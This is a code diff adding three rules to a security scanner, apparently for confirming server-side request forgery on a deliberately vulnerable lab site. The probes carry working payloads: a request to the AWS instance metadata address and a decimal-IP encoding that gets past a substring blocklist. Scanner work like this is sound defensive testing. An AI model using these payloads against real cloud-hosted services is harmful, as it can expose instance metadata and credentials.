@@ -30659,6 +30659,90 @@ const clientSideVulnlabA10SsrfEvidence: Rule = async (ctx) => {
   };
 };
 
+function isSsrfVulnlabHost(ctx: RuleContext): boolean {
+  return /ssrf\.vulnlab\.dev/i.test(ctx.origin);
+}
+
+function ssrfVulnlabLabBody(html: string): string | null {
+  const match = html.match(/<pre class="body">([\s\S]*?)<\/pre>/i);
+  if (!match) return null;
+  return match[1]
+    .replace(/&#34;/g, '"')
+    .replace(/&quot;/g, '"')
+    .replace(/&lt;/g, "<")
+    .replace(/&gt;/g, ">")
+    .replace(/&amp;/g, "&");
+}
+
+const ssrfVulnlabBasicLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/basic/", ctx.origin);
+  probeUrl.searchParams.set("url", "https://example.com/");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(doc.body);
+  if (!body) return NEGATIVE;
+  if (!/Example Domain/i.test(body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: body.slice(0, 240).trim(),
+      note: "ssrf.vulnlab.dev GET /basic/?url=https://example.com/ fetches attacker-controlled URLs and returns the response body — basic SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabMetadataAwsLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/metadata/", ctx.origin);
+  probeUrl.searchParams.set("url", "http://169.254.169.254/latest/meta-data/");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(doc.body);
+  if (!body) return NEGATIVE;
+  const metadataOk =
+    /^ami-id\b/m.test(body) &&
+    /^iam\/\s*$/m.test(body) &&
+    /^instance-id\b/m.test(body);
+  if (!metadataOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: body.slice(0, 240).trim(),
+      note: "ssrf.vulnlab.dev GET /metadata/?url=http://169.254.169.254/latest/meta-data/ returns AWS IMDS metadata tree (ami-id, iam/, instance-id) — cloud metadata SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabBlocklistBypassLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const blockedUrl = new URL("/blocklist/", ctx.origin);
+  blockedUrl.searchParams.set("url", "http://127.0.0.1/");
+  const blockedDoc = await ctx.probe.get(blockedUrl.toString(), { maxBytes: 4096, timeoutMs: 15000 });
+  if (!/banned substring/i.test(blockedDoc.body)) return NEGATIVE;
+  const bypassUrl = new URL("/blocklist/", ctx.origin);
+  bypassUrl.searchParams.set("url", "http://2852039166/latest/meta-data/");
+  const bypassDoc = await ctx.probe.get(bypassUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  if (bypassDoc.status < 200 || bypassDoc.status >= 400) return NEGATIVE;
+  if (/banned substring/i.test(bypassDoc.body)) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(bypassDoc.body);
+  if (!body || !/^ami-id\b/m.test(body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      blockedUrl: blockedUrl.toString(),
+      bypassUrl: bypassUrl.toString(),
+      snippet: body.slice(0, 240).trim(),
+      note: "ssrf.vulnlab.dev /blocklist rejects literal 127.0.0.1 but accepts decimal IP 2852039166 (169.254.169.254) and returns AWS metadata — substring blocklist bypass SSRF oracle"
+    }
+  };
+};
+
 // --- VulnLab Academy API testing labs (hack-this-site-eta.vercel.app/api-labs/*) ----
 const CLIENT_VULNLAB_API_LABS_RES: { label: string; re: RegExp }[] = [
   {
@@ -36299,6 +36383,9 @@ export const RULES: Record<string, Rule> = {
   clientSideVulnlabA08IntegrityEvidence,
   clientSideVulnlabA09LoggingEvidence,
   clientSideVulnlabA10SsrfEvidence,
+  ssrfVulnlabBasicLiveOracle,
+  ssrfVulnlabMetadataAwsLiveOracle,
+  ssrfVulnlabBlocklistBypassLiveOracle,
   clientSideVulnlabApiLabsEvidence,
   clientSideVulnlabCmsPlatformEvidence,
   clientSideVulnlabRubyPlatformEvidence,
